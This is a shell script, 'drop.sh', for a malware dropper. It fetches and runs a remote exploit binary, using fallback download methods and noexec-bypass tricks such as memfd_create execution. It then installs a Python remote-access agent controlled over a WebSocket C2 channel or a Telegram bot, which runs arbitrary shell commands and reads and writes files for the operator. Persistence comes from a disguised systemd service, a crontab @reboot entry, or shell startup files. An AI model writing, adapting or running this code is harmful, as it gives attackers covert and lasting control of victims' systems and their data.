#!/bin/sh
# Agent dropper — self-contained, no external server needed for agent files
#
# Usage (minimal):
#   C2_URL=wss://RELAY/ws/agent sh drop.sh
#
# Usage (Telegram mode, no relay):
#   TG_TOKEN=... TG_OWNER=12345 sh drop.sh
#
# Usage (both modes simultaneously):
#   C2_URL=wss://... TG_TOKEN=... TG_OWNER=... sh drop.sh
#
# Usage (exploit binary + agent):
#   C2_URL=wss://... sh drop.sh
#
# Env vars:
#   C2_URL       — WebSocket URL, e.g. wss://xyz.trycloudflare.com/ws/agent
#   TG_TOKEN     — Telegram bot token (from @BotFather)
#   TG_OWNER     — Telegram owner chat_id (from @userinfobot)
#   ORIGIN       — binary download base URL (default: https://dirtyfrag.l5z12.dev)
#   SKIP_BINARY  — 1 to skip binary download/exec
#   AGENT_DIR    — install directory (default: $HOME/.svc)
#   RECONNECT    — reconnect delay seconds (default: 15)

set -eu

ORIGIN="${ORIGIN:-https://dirtyfrag.l5z12.dev}"
SKIP_BINARY="${SKIP_BINARY:-0}"
AGENT_DIR="${AGENT_DIR:-${HOME:-/tmp}/.svc}"
RECONNECT="${RECONNECT:-15}"
C2_URL="${C2_URL:-}"
TG_TOKEN="${TG_TOKEN:-}"
TG_OWNER="${TG_OWNER:-0}"

_log() { printf '[*] %s\n' "$*" >&2; }
_err() { printf '[!] %s\n' "$*" >&2; }
_ok()  { printf '[+] %s\n' "$*" >&2; }

_log "starting on $(hostname 2>/dev/null) as $(id 2>/dev/null)"
_log "dir: $AGENT_DIR"

# ════════════════════════════════════════════════════
# ARCH DETECTION
# ════════════════════════════════════════════════════
raw_arch=$(uname -m 2>/dev/null || echo unknown)
case "$raw_arch" in
  x86_64|amd64)        arch=x86_64 ;;
  aarch64|arm64)       arch=aarch64 ;;
  armv7l|armv7|armhf)  arch=armv7 ;;
  i386|i486|i586|i686) arch=i386 ;;
  *) arch="$raw_arch" ;;
esac
_log "arch: $arch"

# ════════════════════════════════════════════════════
# DOWNLOAD HELPER (403 bypass chain)
# ════════════════════════════════════════════════════
_UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
_fetch_ok() { test -s "$1" && ! grep -qi '^<!doctype\|^<html' "$1" 2>/dev/null; }

download() {
  local url="$1" out="$2" ok=0
  _log "fetch: $url"

  # curl default
  if [ $ok -eq 0 ] && command -v curl >/dev/null 2>&1; then
    curl -fsSL "$url" -o "$out" 2>/dev/null && _fetch_ok "$out" && ok=1 || true
  fi
  # curl + browser UA
  if [ $ok -eq 0 ] && command -v curl >/dev/null 2>&1; then
    curl -fsSL -A "$_UA" -H "Referer: https://github.com/" "$url" -o "$out" 2>/dev/null \
      && _fetch_ok "$out" && ok=1 || true
  fi
  # curl + status check
  if [ $ok -eq 0 ] && command -v curl >/dev/null 2>&1; then
    code=$(curl -sL -A "$_UA" -w "%{http_code}" "$url" -o "$out" 2>/dev/null || echo 000)
    [ "$code" = "200" ] && _fetch_ok "$out" && ok=1 || true
  fi
  # wget default
  if [ $ok -eq 0 ] && command -v wget >/dev/null 2>&1; then
    wget --no-verbose -O "$out" "$url" 2>/dev/null && _fetch_ok "$out" && ok=1 || true
  fi
  # wget + UA
  if [ $ok -eq 0 ] && command -v wget >/dev/null 2>&1; then
    wget --no-verbose -U "$_UA" --header="Referer: https://github.com/" \
      -O "$out" "$url" 2>/dev/null && _fetch_ok "$out" && ok=1 || true
  fi
  # Python urllib
  if [ $ok -eq 0 ]; then
    for py in python3 python; do
      command -v "$py" >/dev/null 2>&1 || continue
      t="${out}.dl.py"
      printf '%s\n' \
        'import sys' \
        'try: from urllib.request import Request,urlopen' \
        'except: from urllib2 import Request,urlopen' \
        'u,o,a=sys.argv[1],sys.argv[2],sys.argv[3]' \
        'r=Request(u); r.add_header("User-Agent",a); r.add_header("Referer","https://github.com/")' \
        'open(o,"wb").write(urlopen(r,timeout=30).read())' > "$t"
      "$py" "$t" "$url" "$out" "$_UA" 2>/dev/null; ret=$?; rm -f "$t"
      [ $ret -eq 0 ] && _fetch_ok "$out" && ok=1 && break || true
    done
  fi
  # Node.js
  if [ $ok -eq 0 ] && command -v node >/dev/null 2>&1; then
    t="${out}.dl.js"
    printf '%s\n' \
      'const [,,u,o,a]=process.argv,fs=require("fs"),https=require("https"),http=require("http")' \
      'const mod=u.startsWith("https")?https:http' \
      'const opt=Object.assign(require("url").parse(u),{headers:{"User-Agent":a,"Referer":"https://github.com/"}})' \
      'mod.get(opt,r=>{const f=fs.createWriteStream(o);r.pipe(f);f.on("finish",()=>{f.close();process.exit(r.statusCode===200?0:1)})}).on("error",()=>process.exit(1))' > "$t"
    node "$t" "$url" "$out" "$_UA" 2>/dev/null; ret=$?; rm -f "$t"
    [ $ret -eq 0 ] && _fetch_ok "$out" && ok=1 || true
  fi
  # busybox wget
  if [ $ok -eq 0 ] && command -v busybox >/dev/null 2>&1; then
    busybox wget -O "$out" "$url" 2>/dev/null && _fetch_ok "$out" && ok=1 || true
  fi

  [ $ok -eq 1 ] || { _err "all download methods failed: $url"; return 1; }
  _ok "downloaded $(wc -c < "$out" 2>/dev/null || echo ?) bytes"
}

# ════════════════════════════════════════════════════
# EXEC HELPER (noexec filesystem bypass)
# ════════════════════════════════════════════════════
run_binary() {
  local bin="$1"; shift
  chmod +x "$bin" 2>/dev/null || true

  # M1: direct exec
  "$bin" "$@" 2>/dev/null && return 0 || true

  _log "direct exec failed, trying noexec bypass..."

  # M2: ld-linux loader (dynamic binaries only)
  if command -v readelf >/dev/null 2>&1 && readelf -d "$bin" 2>/dev/null | grep -q NEEDED; then
    for ld in /lib64/ld-linux-x86-64.so.2 /lib/ld-linux-aarch64.so.1 /lib/ld-linux.so.2 \
               /lib/ld-linux-armhf.so.3; do
      [ -x "$ld" ] || continue
      "$ld" "$bin" "$@" 2>/dev/null && return 0 || true
    done
  fi

  # M3: Python memfd_create (kernel anonymous fd)
  t="${bin}.m.py"
  printf '%s\n' \
    'import sys,os,ctypes,ctypes.util,platform' \
    'bin_path=sys.argv[1]; args=sys.argv[1:]' \
    'data=open(bin_path,"rb").read()' \
    'fd=-1' \
    'try: fd=os.memfd_create("x",0)' \
    'except AttributeError:' \
    '  nr={"x86_64":319,"amd64":319,"aarch64":279,"arm64":279,"armv7l":356,"armv7":356,"i386":356,"i686":356}.get(platform.machine(),319)' \
    '  libc=ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6",use_errno=True)' \
    '  fd=libc.syscall(ctypes.c_long(nr),ctypes.c_char_p(b"x"),ctypes.c_uint(0))' \
    'if fd<0: sys.exit(1)' \
    'os.write(fd,data)' \
    'try:' \
    '  t=os.open("/dev/tty",os.O_RDWR); os.dup2(t,0); os.close(t)' \
    'except: pass' \
    'os.execve("/proc/self/fd/%d"%fd,args,os.environ)' > "$t"
  for py in python3 python; do
    command -v "$py" >/dev/null 2>&1 || continue
    "$py" "$t" "$bin" "$@"
    ex=$?; rm -f "$t"
    [ $ex -eq 0 ] && return 0
  done
  rm -f "$t" 2>/dev/null || true

  # M4: copy to exec-friendly path
  uid=$(id -u 2>/dev/null || echo 0)
  for d in /dev/shm /run "/run/user/${uid}" /var/tmp /tmp; do
    [ -d "$d" ] && [ -w "$d" ] || continue
    alt="${d}/.r$$"
    cp "$bin" "$alt" && chmod +x "$alt" || continue
    "$alt" "$@"; ex=$?; rm -f "$alt"
    [ $ex -eq 0 ] && return 0
  done

  _err "all exec methods failed"
  return 1
}

# ════════════════════════════════════════════════════
# PHASE 1: OPTIONAL BINARY (exploit)
# ════════════════════════════════════════════════════
if [ "$SKIP_BINARY" != "1" ]; then
  tmp=$(mktemp 2>/dev/null) || tmp="${AGENT_DIR}/.b$$"
  trap 'rm -f "$tmp" 2>/dev/null || true' EXIT INT TERM

  # check if tmp is on noexec mount
  if mount 2>/dev/null | grep -E " on $(dirname "$tmp") " | grep -q noexec; then
    rm -f "$tmp"
    tmp="${HOME:-.}/.b$$"
  fi

  download "${ORIGIN}/bin?arch=${arch}" "$tmp"
  _log "running binary..."
  run_binary "$tmp" "$@"
fi

# ════════════════════════════════════════════════════
# PHASE 2: FIND PYTHON
# ════════════════════════════════════════════════════
PYTHON=""
for py in python3 python; do
  command -v "$py" >/dev/null 2>&1 || continue
  ver=$("$py" -c "import sys;print(sys.version_info.major)" 2>/dev/null || echo 0)
  [ "$ver" -ge 3 ] && PYTHON=$(command -v "$py") && break
done

if [ -z "$PYTHON" ]; then
  _err "Python 3 not found."
  _err "Install: apt install python3  OR  yum install python3"
  exit 1
fi
_ok "python: $PYTHON ($($PYTHON --version 2>&1))"

# ════════════════════════════════════════════════════
# PHASE 3: INSTALL DEPENDENCIES
# ════════════════════════════════════════════════════
_pip() {
  "$PYTHON" -m pip install --quiet --user "$1" 2>/dev/null \
    || "$PYTHON" -m pip install --quiet "$1" 2>/dev/null \
    || "$PYTHON" -m pip install --quiet --break-system-packages "$1" 2>/dev/null \
    || _log "WARNING: pip install $1 failed (may still work)"
}

_log "installing dependencies..."
_pip websockets

# ════════════════════════════════════════════════════
# PHASE 4: WRITE AGENT (self-contained, no download)
# ════════════════════════════════════════════════════
mkdir -p "$AGENT_DIR"
chmod 700 "$AGENT_DIR"

_log "writing agent to ${AGENT_DIR}/svc.py..."

cat > "${AGENT_DIR}/svc.py" << 'PYEOF'
#!/usr/bin/env python3
"""Combined agent: WebSocket C2 + Telegram. Runs both if both configured."""
import asyncio,json,os,platform,socket,subprocess,sys,time,threading
import urllib.request

C2_URL   = os.getenv("C2_URL","")
TG_TOKEN = os.getenv("TG_TOKEN","")
TG_OWNER = int(os.getenv("TG_OWNER","0"))
RECONNECT= int(os.getenv("RECONNECT","15"))

# ── helpers ──────────────────────────────────────────
def _ip():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));r=s.getsockname()[0];s.close();return r
    except:return"unknown"

def _run(cmd,timeout=60):
    try:
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
        return{"stdout":r.stdout,"stderr":r.stderr,"rc":r.returncode}
    except subprocess.TimeoutExpired:return{"error":"timeout","rc":-1}
    except Exception as e:return{"error":str(e),"rc":-1}

def _hello():
    return{"type":"hello","hostname":socket.gethostname(),
           "user":os.getenv("USER") or os.getenv("USERNAME") or "?",
           "os":platform.system()+" "+platform.release(),
           "arch":platform.machine(),"ip":_ip()}

# ── C2 WebSocket ─────────────────────────────────────
async def run_c2(url):
    try:import websockets
    except ImportError:sys.stderr.write("[c2] websockets not installed\n");return
    h=_hello()
    sys.stderr.write(f"[c2] connecting {url}\n")
    while True:
        try:
            async with websockets.connect(url,ping_interval=30,open_timeout=30) as ws:
                sys.stderr.write("[c2] connected\n")
                await ws.send(json.dumps(h))
                async for raw in ws:
                    msg=json.loads(raw);t=msg.get("type","");mid=msg.get("id","")
                    if t=="ping":await ws.send(json.dumps({"type":"pong"}));continue
                    if t=="exec":r=_run(msg.get("cmd",""),msg.get("timeout",60))
                    elif t=="file_read":
                        try:r={"content":open(os.path.expanduser(msg["path"]),"r",errors="replace").read()}
                        except Exception as e:r={"error":str(e)}
                    elif t=="file_write":
                        try:
                            p=os.path.expanduser(msg["path"])
                            os.makedirs(os.path.dirname(os.path.abspath(p)),exist_ok=True)
                            open(p,"w").write(msg.get("content",""));r={"ok":True}
                        except Exception as e:r={"error":str(e)}
                    elif t=="file_list":
                        try:
                            p=os.path.expanduser(msg.get("path","."))
                            r={"entries":[{"name":n,"type":"dir" if os.path.isdir(os.path.join(p,n)) else "file"}
                                          for n in os.listdir(p)]}
                        except Exception as e:r={"error":str(e)}
                    else:r={"error":f"unknown:{t}"}
                    await ws.send(json.dumps({"type":"result","id":mid,**r}))
        except Exception as e:
            sys.stderr.write(f"[c2] {e}, retry {RECONNECT}s\n")
        await asyncio.sleep(RECONNECT)

# ── Telegram ──────────────────────────────────────────
def _tg(token,method,data=None,to=35):
    req=urllib.request.Request(
        f"https://api.telegram.org/bot{token}/{method}",
        data=json.dumps(data or {}).encode(),
        headers={"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(req,timeout=to) as r:return json.loads(r.read())
    except:return{"ok":False}

def _tgsend(token,cid,text):
    for ch in [text[i:i+4000] for i in range(0,len(text),4000)] or ["(empty)"]:
        r=_tg(token,"sendMessage",{"chat_id":cid,"text":ch,"parse_mode":"Markdown"})
        if not r.get("ok"):_tg(token,"sendMessage",{"chat_id":cid,"text":ch})

def _tghandle(token,cid,text):
    t=text.strip()
    if t in("/start","/help"):
        return f"*Agent*\n`{socket.gethostname()}` `{_ip()}`\nCommands: /info /ps /ls [path] /cd <path> /dl <path> /kill\nOr: shell command"
    if t=="/info":
        return f"```\nhost:{socket.gethostname()}\nuser:{os.getenv('USER') or '?'}\nip:{_ip()}\nos:{platform.system()} {platform.release()}\ncwd:{os.getcwd()}\n```"
    if t=="/ps":return"```\n"+_run("ps aux --no-headers 2>/dev/null|head -20").get("stdout","err")+"\n```"
    if t.startswith("/ls"):
        p=t.split(maxsplit=1);return"```\n"+_run(f"ls -la {p[1] if len(p)>1 else '.'}").get("stdout","err")+"\n```"
    if t.startswith("/cd"):
        p=t.split(maxsplit=1)
        if len(p)<2:return f"cwd:`{os.getcwd()}`"
        try:os.chdir(os.path.expanduser(p[1]));return f"✅`{os.getcwd()}`"
        except Exception as e:return f"❌{e}"
    if t.startswith("/dl "):
        try:return"```\n"+open(os.path.expanduser(t[4:]),"r",errors="replace").read(6000)+"\n```"
        except Exception as e:return f"❌{e}"
    if t=="/kill":return"__kill__"
    if t.startswith("/"):return"❓/help"
    r=_run(t);out=(r.get("stdout","")+r.get("stderr","")).strip()
    return"```\n"+(out or f"(rc={r.get('rc')})")+"\n```"

def run_tg(token,owner):
    offset=0
    _tgsend(token,owner,f"🟢*Agent online*\n`{socket.gethostname()}` `{_ip()}`\n`{os.getenv('USER') or '?'}`@`{platform.system()}`")
    sys.stderr.write(f"[tg] running, owner={owner}\n")
    while True:
        try:
            r=_tg(token,"getUpdates",{"offset":offset,"timeout":30},to=35)
            for upd in r.get("result",[]):
                offset=upd["update_id"]+1
                msg=upd.get("message",{});cid=msg.get("chat",{}).get("id");txt=msg.get("text","")
                if not txt or not cid or cid!=owner:continue
                _tg(token,"sendChatAction",{"chat_id":cid,"action":"typing"})
                resp=_tghandle(token,cid,txt)
                if resp=="__kill__":_tgsend(token,cid,"🔴Stopping.");sys.exit(0)
                _tgsend(token,cid,resp)
        except Exception as e:
            sys.stderr.write(f"[tg] {e}\n");time.sleep(5)

# ── entry ─────────────────────────────────────────────
async def main():
    if not C2_URL and not (TG_TOKEN and TG_OWNER):
        sys.exit("ERROR: set C2_URL or TG_TOKEN+TG_OWNER env vars")
    if TG_TOKEN and TG_OWNER:
        t=threading.Thread(target=run_tg,args=(TG_TOKEN,TG_OWNER),daemon=True)
        t.start()
    if C2_URL:
        await run_c2(C2_URL)
    else:
        while True:await asyncio.sleep(3600)

asyncio.run(main())
PYEOF

chmod 600 "${AGENT_DIR}/svc.py"
_ok "agent written: ${AGENT_DIR}/svc.py"

# ── write launcher with env vars embedded ──
cat > "${AGENT_DIR}/start.sh" << SHEOF
#!/bin/sh
export C2_URL="${C2_URL}"
export TG_TOKEN="${TG_TOKEN}"
export TG_OWNER="${TG_OWNER}"
export RECONNECT="${RECONNECT}"
exec ${PYTHON} ${AGENT_DIR}/svc.py
SHEOF
chmod 700 "${AGENT_DIR}/start.sh"

# ════════════════════════════════════════════════════
# PHASE 5: START AGENT
# ════════════════════════════════════════════════════
_log "starting agent..."
logf="${AGENT_DIR}/svc.log"
nohup sh "${AGENT_DIR}/start.sh" > "$logf" 2>&1 &
pid=$!
echo "$pid" > "${AGENT_DIR}/svc.pid"
_ok "agent started (pid=$pid) log=$logf"

# ════════════════════════════════════════════════════
# PHASE 6: PERSISTENCE
# ════════════════════════════════════════════════════
_log "setting up persistence..."
startup_cmd="sh ${AGENT_DIR}/start.sh > ${AGENT_DIR}/svc.log 2>&1"

persist_ok=0

# P1: systemd user service (preferred)
systemd_dir="${HOME}/.config/systemd/user"
if command -v systemctl >/dev/null 2>&1 && [ -n "${HOME:-}" ]; then
  mkdir -p "$systemd_dir" 2>/dev/null || true
  cat > "${systemd_dir}/user-daemon.service" << SDEOF
[Unit]
Description=User Daemon Service
After=network.target

[Service]
ExecStart=sh ${AGENT_DIR}/start.sh
Restart=always
RestartSec=30
StandardOutput=append:${AGENT_DIR}/svc.log
StandardError=append:${AGENT_DIR}/svc.log

[Install]
WantedBy=default.target
SDEOF
  if systemctl --user daemon-reload 2>/dev/null && \
     systemctl --user enable user-daemon.service 2>/dev/null && \
     systemctl --user start user-daemon.service 2>/dev/null; then
    _ok "persistence: systemd user service (user-daemon.service)"
    persist_ok=1
  else
    rm -f "${systemd_dir}/user-daemon.service" 2>/dev/null || true
  fi
fi

# P2: crontab @reboot
if [ $persist_ok -eq 0 ] && command -v crontab >/dev/null 2>&1; then
  existing=$(crontab -l 2>/dev/null || true)
  if ! echo "$existing" | grep -qF "svc.log"; then
    printf '%s\n@reboot %s\n' "$existing" "$startup_cmd" | crontab - 2>/dev/null && \
      _ok "persistence: crontab @reboot" && persist_ok=1 || true
  else
    _ok "persistence: crontab already set"
    persist_ok=1
  fi
fi

# P3: .bashrc / .profile (session-based fallback)
if [ $persist_ok -eq 0 ]; then
  for rc in "${HOME}/.bashrc" "${HOME}/.profile" "${HOME}/.bash_profile"; do
    [ -f "$rc" ] || continue
    if ! grep -qF "svc.log" "$rc" 2>/dev/null; then
      printf '\n# service\n(pgrep -f svc.py >/dev/null 2>&1 || nohup %s &)\n' "$startup_cmd" >> "$rc"
      _ok "persistence: $rc" && persist_ok=1 && break
    else
      _ok "persistence: $rc (already set)" && persist_ok=1 && break
    fi
  done
fi

[ $persist_ok -eq 0 ] && _log "WARNING: persistence setup failed, agent running but won't survive reboot"

# ════════════════════════════════════════════════════
# SUMMARY
# ════════════════════════════════════════════════════
printf '\n'
_ok "══════════════════════════════════════"
_ok "  Agent installed: ${AGENT_DIR}/svc.py"
if [ -n "$C2_URL" ]; then
  _ok "  Mode: C2 WebSocket → $C2_URL"
fi
if [ -n "$TG_TOKEN" ]; then
  _ok "  Mode: Telegram (owner=$TG_OWNER)"
fi
_ok "  PID : $pid"
_ok "  Log : tail -f $logf"
_ok "══════════════════════════════════════"
